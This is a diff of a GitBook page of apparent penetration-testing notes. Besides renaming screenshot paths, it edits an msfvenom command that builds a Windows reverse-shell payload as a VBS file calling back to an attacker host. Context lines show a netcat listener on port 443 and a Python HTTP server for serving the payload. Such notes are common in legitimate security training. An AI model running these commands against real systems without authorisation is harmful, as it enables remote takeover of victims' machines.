@@ -25,11 +25,11 @@ python2 -m SimpleHTTPServer 81
 rlwrap nc -lvnp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
 
@@ -38,7 +38,7 @@ rlwrap nc -lvnp 443
 **Kali #1**
 
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vba -o exploit.vbs
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vbs -o exploit.vbs
 ```
 
 **Kali #2**
@@ -46,6 +46,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vba -o exploi
 ```
 rlwrap nc -lvnp 443
 ```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ### DOC
 
